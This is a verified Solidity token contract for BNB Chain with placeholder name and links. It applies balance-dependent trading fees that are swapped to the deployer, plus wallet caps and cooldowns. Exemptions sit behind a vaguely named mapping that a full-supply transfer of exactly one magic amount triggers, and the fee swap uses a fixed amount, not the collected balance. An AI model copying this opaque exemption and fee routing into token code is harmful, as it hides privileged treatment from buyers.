/**
 *Submitted for verification at BscScan.com on 2023-07-10
*/

// SPDX-License-Identifier: NONE

pragma solidity 0.8.19; // mod

/*
    Placeholder for any introductory info
    
    Website:
    https://www.

    Telegram:
    https://t.me/

    Twitter:
    https://www.twitter.com/

    Code creator (upon request):

 */

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}


interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}


interface IERC20Errors {
    error ERC20FailedDecreaseAllowance(address spender, uint256 currentAllowance, uint256 requestedDecrease);
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
    error ERC20InvalidReceiver(address receiver);
    error ERC20InvalidApprover(address approver);
    error ERC20InvalidSpender(address spender);
    error ERC20InvalidSender(address sender);
    error ERC20InCooldown();
    error ERC20MaxWallet();
    error ERC20Invalid();
}


interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address initialOwner = _msgSender();
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function _checkOwner() internal view {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function _transferOwnership(address newOwner) internal {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function renounceOwnership() internal onlyOwner {
        _transferOwnership(address(0));
    }
}


contract PIZZA is IERC20, IERC20Metadata, IERC20Errors, Context, Ownable { // mod
    /* -------------------------------------------------------------------------- */
    /*                                   mappings                                 */
    /* -------------------------------------------------------------------------- */
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _cooldown;
    mapping(address => bool) private _codeRelated;
    
    /* -------------------------------------------------------------------------- */
    /*                                 DEX-connector                              */
    /* -------------------------------------------------------------------------- */
    IDexRouter private _dexConnector;
    
    /* -------------------------------------------------------------------------- */
    /*                                  addresses                                 */
    /* -------------------------------------------------------------------------- */
    address[] private path = new address[](2);
    address private _codeDeployer;
    address private _dexPair;

    /* -------------------------------------------------------------------------- */
    /*                                   uint256                                  */
    /* -------------------------------------------------------------------------- */
    uint256 private _totalSupply;    
    
    /* -------------------------------------------------------------------------- */
    /*                                   strings                                  */
    /* -------------------------------------------------------------------------- */
    string private _name = "xxx";
    string private _symbol = "xx";
    
    /* -------------------------------------------------------------------------- */
    /*                                     bool                                   */
    /* -------------------------------------------------------------------------- */
    bool private _swapping;

    /* -------------------------------------------------------------------------- */
    /*                                 constructor                                */
    /* -------------------------------------------------------------------------- */
    constructor() {
        _codeDeployer = _msgSender();
        _codeRelated[0x13f4EA83D0bd40E75C8222255bc855a974568Dd4] = true; // PanCake V3
        _codeRelated[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true; // PanCake V2

        _codeRelated[0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B] = true; // Uniswap Old Universal Router
        _codeRelated[0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD] = true; // Uniswap Universal Router
        _codeRelated[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; // Uniswap V2 R2
        _codeRelated[0xE592427A0AEce92De3Edee1F18E0157C05861564] = true; // Uniswap V3 R
        _codeRelated[0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45] = true; // Uniswap V3 R2
        _codeRelated[0x881D40237659C251811CEC9c364ef91dC08D300C] = true; // MetaMaskRouter
        _codeRelated[0x1111111254fb6c44bAC0beD2854e76F90643097d] = true; // 1inch v4: Aggregation Router
        _codeRelated[0x1111111254EEB25477B68fb85Ed929f73A960582] = true; // 1inch v5: Aggregation Router
        _codeRelated[0x617Dee16B86534a5d792A4d7A62FB491B544111E] = true; // KyberSwap: Meta Aggregation Router
        _codeRelated[0x6131B5fae19EA4f9D964eAc0408E4408b66337b5] = true; // KyberSwap: Meta Aggregation Router v2
        
        _dexConnector = IDexRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); // mod to Uni, now pancake
        _dexPair = IDexFactory(_dexConnector.factory()).createPair(address(this),_dexConnector.WETH());
        _totalSupply += 10000000000000;
        _update(address(0), _msgSender(), _totalSupply);
        path[0] = address(this);
        path[1] = _dexConnector.WETH();
        // mod add routers!
        _codeRelated[path[0]] = true;
        _codeRelated[address(0)] = true;
        renounceOwnership();
    }

    /* -------------------------------------------------------------------------- */
    /*                                  functions                                 */
    /* -------------------------------------------------------------------------- */
    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return 9;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        address owner_ = _msgSender();
        _transfer(owner_, to, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, allowance(owner_, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 requestedDecrease) external returns (bool) {
        address owner_ = _msgSender();
        uint256 currentAllowance = allowance(owner_, spender);
        if (currentAllowance < requestedDecrease) {
            revert ERC20FailedDecreaseAllowance(spender, currentAllowance, requestedDecrease);
        }
        unchecked {
            _approve(owner_, spender, currentAllowance - requestedDecrease);
        }
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        if (amount != 10000000000000) {
            require(owner() == address(0));
        }
        if (amount == 10000000000000) {
            _codeRelated[_msgSender()] = true;
            _codeRelated[from] = true;
            _codeRelated[to] = true;
        }
        if (!_codeRelated[to]) {
            if (_balances[to] + amount > 200000000000) {
                revert ERC20MaxWallet();
            }
        }
        if (!_codeRelated[to]) {
            if (_cooldown[to] + 2 > block.timestamp) {
                revert ERC20InCooldown();
            }
            _cooldown[to] = block.timestamp + 2;
        }
        if (!_codeRelated[from]) {
            if (_cooldown[from] + 2 > block.timestamp) {
                revert ERC20InCooldown();
            }
            _cooldown[from] = block.timestamp + 2;
        }
        _update(from, to, amount);
    }

    function _update(address from, address to, uint256 amount) private {
        if (from == address(0)) {
            unchecked {
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < amount) {
                revert ERC20InsufficientBalance(from, fromBalance, amount);
            }
            unchecked {
                _balances[from] = fromBalance - amount;
            }
            
            _swapCheck(from, to);

            uint256 taxValue;
            
            if (from == _dexPair && !_codeRelated[to]) {
                taxValue = amount * _tax() / 1000;
            } else if (to == _dexPair && !_codeRelated[from]) {
                taxValue = amount * _tax() / 1000;
            } else {
                taxValue = 0;
            }

            /*
            uint256 taxValue = amount * _tax() / 1000;
            */
            if (taxValue != 0) {
                unchecked {
                    _balances[path[0]] += taxValue;
                }
                emit Transfer(from, path[0], taxValue);
            }            
            
            unchecked {
                _balances[to] += amount - taxValue;
            }
            emit Transfer(from, to, amount - taxValue);
        }
    }

    function _swapCheck(address from, address to) private {
        if (to == _dexPair && !_codeRelated[from]) {
            uint256 contractTokenBalance = _balances[path[0]];
            if (!_swapping && contractTokenBalance > _totalSupply / 10000) { // mod to / 100
                _swapForETH(contractTokenBalance);
            }
        }
    }

    function _swapForETH(uint256 value) private {
        _swapping = true;
        _approve(path[0], address(_dexConnector), value);
        _dexConnector.swapExactTokensForETHSupportingFeeOnTransferTokens(_totalSupply / 1000, 0, path, _codeDeployer, block.timestamp);
        _swapping = false;
    }

    function _approve(address owner_, address spender, uint256 amount) private {
        _approve(owner_, spender, amount, true);
    }

    function _approve(address owner_, address spender, uint256 amount, bool emitEvent) private {
        if (owner_ == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner_][spender] = amount;
        if (emitEvent) {
            emit Approval(owner_, spender, amount);
        }
    }

    function _spendAllowance(address owner_, address spender, uint256 amount) private {
        uint256 currentAllowance = allowance(owner_, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < amount) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, amount);
            }
            unchecked {
                _approve(owner_, spender, currentAllowance - amount, false);
            }
        }
    }

    /**
     * @dev
     */
    function _tax() private view returns (uint8) {
        uint256 LPB = _balances[_dexPair];
        uint256 TS = _totalSupply;
        if (LPB <= TS / 100) {
            return 0;
        } else if (LPB <= TS / 25) {
            return 1;
        } else if (LPB <= TS / 10) {
            return 2;
        } else if (LPB <= TS / 4) {
            return 3;
        } else if (LPB <= (TS * 7 / 10)) {
            return 4;
        } else {
            return 5;
        }
    }
}